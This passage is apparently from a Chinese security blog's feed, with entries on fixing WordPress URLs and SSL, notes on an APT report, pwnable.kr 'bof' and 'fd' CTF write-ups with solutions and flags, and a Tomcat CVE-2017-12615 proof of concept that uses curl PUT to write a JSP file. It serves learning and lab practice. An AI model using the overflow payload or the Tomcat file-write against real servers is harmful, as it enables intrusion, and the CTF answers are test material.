class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">USE wordpress;<br></code></pre></td></tr></table></figure><p>列举wp-content表单前5的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from wp_options limit 5;<br></code></pre></td></tr></table></figure><p>修改数据库中的数据，将双引号内的域名换为自己的域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE wp_options SET option_value=&quot;http://www.xxxxx.com&quot; WHERE option_name=&quot;siteurl&quot;;<br></code></pre></td></tr></table></figure><p>至此修复完毕，刷新浏览器即可看到正常的页面。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="WordPress配置SSL证书"><a href="#WordPress配置SSL证书" class="headerlink" title="WordPress配置SSL证书"></a>WordPress配置SSL证书</h3><p><strong>证书申请</strong></p><p>腾讯云有免费的SSL证书，我上去申请了一个</p><p><strong>安装方法：</strong></p><h4 id="1-1-获取证书"><a href="#1-1-获取证书" class="headerlink" title="1.1 获取证书"></a>1.1 获取证书</h4><p>Apache文件夹内获得证书文件 1_root_bundle.crt，2_<a href="http://www.domain.com_cert.crt/">www.domain.com_cert.crt</a> 和私钥文件 3_<a href="http://www.domain.com.key/">www.domain.com.key</a>,<br>1_root_bundle.crt 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”,<br>2_<a href="http://www.domain.com_cert.crt/">www.domain.com_cert.crt</a> 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”,<br>3_<a href="http://www.domain.com.key/">www.domain.com.key</a> 文件包括一段私钥代码“—–BEGIN RSA PRIVATE KEY—–”和“—–END RSA PRIVATE KEY—–”。</p><h4 id="1-2-证书安装"><a href="#1-2-证书安装" class="headerlink" title="1.2 证书安装"></a>1.2 证书安装</h4><p>编辑Apache根目录下 <code>/etc/apache2/sites-enabled/default-ssl.conf</code>文件:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;VirtualHost _default_:<span class="hljs-number">443</span>&gt;<br>    DocumentRoot <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    ServerName www.domain.com<br>    SSLEngine on<br>    SSLCertificateFile <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>conf/<span class="hljs-number">2</span>_www.domain.com_cert.crt<br>    SSLCertificateKeyFile <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>conf/<span class="hljs-number">3</span>_www.domain.com.key<br>    SSLCertificateChainFile <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>conf/<span class="hljs-number">1</span>_root_bundle.crt<br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure><p>大力出奇迹，我在寻找相关配置的选项的时候出了很多差错，导致网站一度拒绝连接，而且的我的腾讯云也没有一键备份还原的选项，搞崩了就得做好重装的准备，因此我强烈建议把你要修改的文件做一个备份，或者在修改时别直接在原选项上修改，而是注释掉官方的，自己手打一行，如果不行的话就把自己的删掉不影响原来的数据，我选择把源文件中所有的选项都注释掉，然后直接将上述代码粘贴到配置文件里，不容易出错，最后用<code>sudo service apsche2 restart</code>命令重启一下服务就能发现网站已经正确配置了ssl，但是wordpress可能在某些页面上仍然无法正确显示https，原因是要修改数据库里面的url，方法见文章上半部分，将http修改为https即可。</p>]]></content>
    
    
    <categories>
      
      <category>日常挖坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>Wordpress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>全球高级持续性威胁(APT)2018年中报告研读心得</title>
    <link href="/2018/09/%E5%85%A8%E7%90%83%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81-APT-2018%E5%B9%B4%E4%B8%AD%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB%E5%BF%83%E5%BE%97/"/>
    <url>/2018/09/%E5%85%A8%E7%90%83%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81-APT-2018%E5%B9%B4%E4%B8%AD%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<p>在读了这篇文章之后，我对APT攻击又有了进一步的认识。</p><p><strong>研究APT的作用</strong> 研究APT的攻击的作用不言而喻，近年来全球的APT攻击处在一个较为活跃的状态，安全厂商和研究人员需要持续 观察APT组织的动向，防患于未然。 </p><p><strong>APT组织的攻击目的</strong> 首先，由于APT的特殊性，对攻击目标进行长期的信息收集和刺探并在合适的时机发动攻击需要巨大的人力物力资 源，因此很少有个人黑客发动攻击的例子，APT组织通常是由政府和国家的情报机构等资助的，而其针对的目标也 并非盗取个人账号等小型目标，攻击的对象必然是政府军队，军事情报，高新技术等高价值目标。在这些攻击目的 中，很多情况下APT组织是为了获取一些重要情报或者是破坏目标的正常运作，因此，在分析一次APT攻击的时候 可以适当根据当前国情或外交状况来分析可能的攻击来源。 </p><span id="more"></span><p><strong>APT组攻击战术特点</strong> 由于网络军火的民用化，无论是谁，只要是稍花心思就能较为容易的获取已经公开的攻击手段，而且例如 Metasploit等攻击框架的兴起也使得实施一次攻击的成本降低，2017年NSA武器库也能在GitHub上轻松下载，即 使是一个高中生也可以直接利用这些攻击脚本来进行对仍存在安全隐患的设备发起攻击，APT组织也是如此，在网 络上可以很轻松的找到APT组织针对的目标的0day漏洞信息，如一台服务器上部署了一个较为陈旧的apache版 本，且存在重大漏洞，黑客无需自行编写漏洞利用脚本便可发起攻击，这无疑对一些重要目标设备的维护带来了一 定的挑战，攻击过程中也经常设计企业或重要部门机构在构建安全防护体系中最容易出现漏洞的一环–人，因此才 有了很多通过一些常用的社工手段、渔叉攻击，水坑攻击等一些APT攻击过程中的常用手段，而这些攻击流程十分 隐蔽，攻击者自然也不愿意在这些攻击流程中暴漏自己的身份，因此攻击者在攻击手法上有一定的迷惑性，因此我 认为在做样本分析时，得有一定的判断能力例如一次APT攻击中使用的c2服务器在之前的某次攻击中用过，而且也 有确定的组织，但是这次的攻击过程中c2服务器并没有起到实际的作用，因而可以推测这个应该是APT组织使用的 障眼法，因此我们在做APT攻击行为研究的时候应该深入的挖掘攻击者的思路，还原攻击流程，而不是停留在表 面。</p><ul><li>方程式一类的顶尖APT组织掌握最先进的漏洞攻击技术 方程式一类顶尖的APT组织掌握了最先进的漏洞攻击技术，这包括了其对几乎所有互联网相关设施、设备、软件、应用漏洞的全覆盖，而其它APT组织依然钟情于使用客户端软件的漏洞进行钓鱼攻击。</li><li>针对Office的漏洞攻击依然是大部分APT攻击的焦点 从使用频率上来看，Office漏洞依然是大部分APT组织最常使用的漏洞，且依然是非常有效的APT攻击入口。</li><li>移动端APT攻击逐渐成为新的焦点 移动设备的普及程度和市场占有率的大幅度提升，所以APT组织也开始将针对其目标对象的攻击范围延伸至移动设 备领域。在过去针对移动设备攻击的APT活动中，以针对iOS系统的三叉戟漏洞和针对Android系统的Hacking Team泄露的浏览器攻击利用尤为出众，并揭示了移动定向攻击中也同样具备过去网络攻击中展现的技术高级性特 点，也揭示了网络军火商制作和贩卖针对移动平台的网络武器的事实。</li></ul><p><strong>针对APT攻击的分析思路切入点</strong> 现在的APT攻击都有很好的伪装性，在前期的信息收集阶段和后期的渗透、攻击阶段采用的所有技术手段都是匿名 的，所以在分析攻击来源的时候难度很大，我发现现在一些安全厂家的分析方式是做关联，我之前看过一种理论， 当样本数量达到一定规模的时候，通过一些交集来划分出一个特定的群体难度并不大，比如，一个学校中，给出以 下几个标签：男生，喜欢玩英雄联盟，打篮球好，白羊座等，其实简单的几个标签就能把原来数量很大的元数据划 分为很小的目标区域，如果再一些很少的标签，那么目标群体又能以指数级的缩减从而进一步方便确定对象。这一 思想也广泛的运用到了APT攻击的分析过程当中，有的厂家在分析的时候会比对攻击手法中的一些环节的特征来确 定攻击的来源，如某一组织的攻击样本的hash，其设定c2服务器的习惯，域名的设定方式，漏洞的利用手段，样 本中一些特定行为，攻击的主要目标或地区等，一些安全厂家可能会采用机器学习的方式用代码来对这些元信息进 行关联，得到一个相对完整的攻击图谱，对于普通的安全研究者（比如我们）来说，只能通过手动的信息收集来进 行关联，主要考察信息搜集能力与信息的拓展和联想能力，关联成功后便能较为容易的确定攻击来源，以便于日后 加紧攻击意向的跟踪步进或者是为安全戒备做好指导。</p>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
      <tag>心得</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bof(pwnable.kr_bof)缓冲区溢出简单利用</title>
    <link href="/2018/09/bof-pwnable-kr-bof-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <url>/2018/09/bof-pwnable-kr-bof-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>题目传送门：<a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> </p><p><img src="https://i.loli.net/2018/09/29/5baee30de4cb4.png"></p><p>下载连接中的源代码和二进制文件后，查看源代码如下</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">(<span class="hljs-type">int</span> key)</span>&#123;<br>    <span class="hljs-type">char</span> overflowme[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;overflow me : &quot;</span>);<br>    gets(overflowme);   <span class="hljs-comment">// smash me!</span><br>    <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xcafebabe</span>)&#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nah..\n&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span>&#123;<br>    func(<span class="hljs-number">0xdeadbeef</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断这个时考察缓冲区溢出的题目，漏洞产生原因时gets()函数对输入的数据长度没有做检查，导致溢出，上gdb分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali-linux:~/文档/PWN/pwnable.kr/3.bof<span class="hljs-comment"># gdb -q ./bof</span><br><br>warning: build/bdist.linux-x86_64/wheel/peda/peda.py: No such file or directory<br>Reading symbols from ./bof...(no debugging symbols found)...<span class="hljs-keyword">done</span>.<br>gdb-peda$ pattern_creat 150<br><span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&#x27;</span><br>gdb-peda$ r<br>Starting program: /root/文档/PWN/pwnable.kr/3.bof/bof <br>overflow me : <br>AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA<br>Nah..<br>*** stack smashing detected ***: /root/文档/PWN/pwnable.kr/3.bof/bof terminated<br><br>Program received signal SIGSEGV, Segmentation fault.<br><br>[----------------------------------registers-----------------------------------]<br>EAX: 0x31414162 (<span class="hljs-string">&#x27;bAA1&#x27;</span>)<br>EBX: 0xf7fcf000 --&amp;gt; 0x1bef0 <br>ECX: 0xffffd210 (<span class="hljs-string">&quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&quot;</span>)<br>EDX: 0xf7ffd4fc --&amp;gt; 0x0 <br>ESI: 0xffffc9e0 --&amp;gt; 0x0 <br>EDI: 0xffffc9e0 --&amp;gt; 0x0 <br>EBP: 0xffffcab8 --&amp;gt; 0xffffcb18 --&amp;gt; 0xf7fa4000 --&amp;gt; 0x1b2db0 <br>ESP: 0xffffc910 --&amp;gt; 0x40000000 (<span class="hljs-string">&#x27;&#x27;</span>)<br>EIP: 0xf7fc6886 (cmp    WORD PTR [eax],0xb858)<br>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xf7fc687e:  xchg   ax,ax<br>   0xf7fc6880:  mov    ecx,DWORD PTR [eax+0x48]<br>   0xf7fc6883:  mov    eax,DWORD PTR [eax+0x4c]<br>=&amp;gt; 0xf7fc6886:  cmp    WORD PTR [eax],0xb858<br>   0xf7fc688b:  je     0xf7fc6b28<br>   0xf7fc6891:  cmp    BYTE PTR [eax],0xb8<br>   0xf7fc6894:  jne    0xf7fc68b0<br>   0xf7fc6896:  cmp    DWORD PTR [eax+0x1],0xad<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffc910 --&amp;gt; 0x40000000 (<span class="hljs-string">&#x27;&#x27;</span>)<br>0004| 0xffffc914 --&amp;gt; 0x0 <br>0008| 0xffffc918 --&amp;gt; 0xffffc960 --&amp;gt; 0x0 <br>0012| 0xffffc91c --&amp;gt; 0xf7fcf000 --&amp;gt; 0x1bef0 <br>0016| 0xffffc920 --&amp;gt; 0x0 <br>0020| 0xffffc924 --&amp;gt; 0x0 <br>0024| 0xffffc928 --&amp;gt; 0x0 <br>0028| 0xffffc92c --&amp;gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0xf7fc6886 <span class="hljs-keyword">in</span> ?? () from /lib/i386-linux-gnu/libgcc_s.so.1<br>gdb-peda$ pattern_offset AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA<br>AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgA found at offset: 52<br></code></pre></td></tr></table></figure><p>判断溢出的偏移位数为52，而在代码中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xcafebabe</span>)&#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>需要将key所在的内存数据替换为<code>0xcafebabe</code>，而通过file命令我们可以知道本程序为32位程序，采用小端序，因此我们只需构造<code>&quot;A&quot;*52+&quot;&quot;\xbe\xba\xfe\xca&quot;</code>来进行溢出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali-linux:~/文档/PWN/pwnable.kr/3.bof<span class="hljs-comment"># file bof</span><br>bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped<br></code></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(perl -e <span class="hljs-string">&#x27;print &quot;A&quot;x52 . &quot;\xbe\xba\xfe\xca\n&quot;&#x27;</span>; <span class="hljs-built_in">cat</span> -) | ./bof<br></code></pre></td></tr></table></figure><p>即可运行<code>/bin/sh</code>来cat flag:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">daddy, I just pwned a buFFer :)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat 远程代码执行漏洞 (CVE-2017-12615)</title>
    <link href="/2018/09/Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615/"/>
    <url>/2018/09/Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先还是通过docker搭建实验环境 ，实验环境需要docker来挂载，docker安装教程：<a href="https://blog.csdn.net/levones/article/details/80474994">https://blog.csdn.net/levones/article/details/80474994</a></p><p>下载docker镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull medicean/vulapps:t_tomcat_1<br></code></pre></td></tr></table></figure><span id="more"></span><p>启动镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d -p 8001:8080 medicean/vulapps:t_tomcat_1<br></code></pre></td></tr></table></figure><p>启动镜像的命令中-p 8001:8080中冒号之前的端口号可自行指定</p><p>Docker成功挂载后访问ip:port的界面：</p><p><img src="https://s1.ax1x.com/2018/05/28/C4K7ee.png" alt="C4K7ee.png"></p><h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01  POC"></a>0x01  POC</h2><p>这个漏洞的利用代码比较简单，是直接使用curl向网站根目录下写入一个jsp文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT <span class="hljs-string">&quot;http://your_server_ip:port/test.jsp/&quot;</span> -d <span class="hljs-string">&#x27;&lt;%out.println(&quot;Test_hack&quot;);%&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>命令成功执行后直接访问测试靶机<a href="http://ip:port/test.jsp即可看到成功向靶机写入了一个jsp文件。">http://ip:port/test.jsp即可看到成功向靶机写入了一个jsp文件。</a></p><p><img src="https://s1.ax1x.com/2018/05/28/C4KoLD.png" alt="C4KoLD.png"></p><p>关于此漏洞更加详细的分析与利用：<a href="https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw">https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fd_WriteUp(pwnable.kr_fd)Linux文件描述符</title>
    <link href="/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/"/>
    <url>/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>本题目来自：<a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a></p><p><img src="https://s1.ax1x.com/2018/07/13/PKn8Q1.png" alt="PKn8Q1.png"></p><p>首先根据题目提示使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh fd@pwnable.kr -p2222<br></code></pre></td></tr></table></figure><span id="more"></span><p>来连接到目标服务器，密码为guest</p><p><img src="https://s1.ax1x.com/2018/07/13/PKn1zR.png" alt="PKn1zR.png"></p><p>ls一下发现当前目录下有三个文件，一看到flag字样的文件名就下意识的cat flag但是发现没有读取权限，而除了flag文件外还有一个源码和一个可执行文件，显然作者的意图是让玩家分析源代码再通过可执行文件读取flag里面的内容。</p><p><img src="https://s1.ax1x.com/2018/07/13/PKnGsx.png" alt="PKnGsx.png"></p><p>fd.c内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>* envp[])</span>&#123;<br><span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pass argv[1] a number\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br>len = read(fd, buf, <span class="hljs-number">32</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;good job :)\n&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;learn about Linux file IO\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们来分析一下代码</p><p>首先main函数使用了带参数的形式：<code>int main(int argc, char* argv[], char* envp[])</code></p><p>argc: 参数的个数，不给main()函数传递参数时默认值为1，即至少有一个参数为该可执行文件的文件名（含目录）。</p><p>argv: 为指针数组，分别指向各个字符串参数的首地址，其中argv[0]存储的是可执行文件的文件名的首地址 。</p><p>envp:存放系统的环境变量 。</p><p>假设有一个文件名为1.sh的文件中主函数声明为<code>int main(int argc , char* argv[] )</code>的形式，如果调用时使用<code>root@kali-linux:~# ./1.sh hahaha xixixi hehehe</code>的形式，则此时argc的值为4，argv[0]为“1.sh” ，argv[1]为“hahaha”，argv[2]为“xixixi”，argv[3]为“hehehe”   。</p><p>那么这个代码块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pass argv[1] a number\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>表示的意思是运行fd的时候需要加参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br>len = read(fd, buf, <span class="hljs-number">32</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;good job :)\n&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码将argv[1]即第一个参数做了转整型的处理，使用的是atoi()函数：</p><p><strong>int atoi(const char *str)</strong> 把参数 <strong>str</strong> 所指向的字符串转换为一个整数（类型为 int 型）</p><p>而后面又使用<code>read(fd, buf, 32)</code>把fd（文件描述）所指的文件传送32个字节到buf所指的内存中，read()函数返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据。若参数count 为0, 则read()不会有作用并返回0。</p><p>关于文件描述符：</p><table><thead><tr><th>文件描述符的值</th><th>意义</th></tr></thead><tbody><tr><td>0</td><td>标准输入</td></tr><tr><td>1</td><td>标准输出</td></tr><tr><td>2</td><td>错误</td></tr></tbody></table><p><code>strcmp(&quot;LETMEWIN\n&quot;, buf)</code>将用户输入的字符串与“LETMEWIN”进行比较，如果一致则输出flag的内容，因此我们需要找到输入的点，因此本题的关键点在于通过控制argv[1] (第一个参数)来修改文件的描述符为0从而修改文件状态为标准输入，再输入“LETMEWIN”来得到flag，此时我们需要考虑如何时文件描述符为0，<code>int fd = atoi( argv[1] ) - 0x1234</code>文件描述符在程序中的变量名为fd(file descriptor),因此我们需要将<code>atoi( argv[1] ) - 0x1234</code>的值设为0,0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">fd@ubuntu:~$ ./fd 4660<br>LETMEWIN<br>good job :)<br>mommy! I think I know what a file descriptor is!!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WordPress小于等于4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)实验</title>
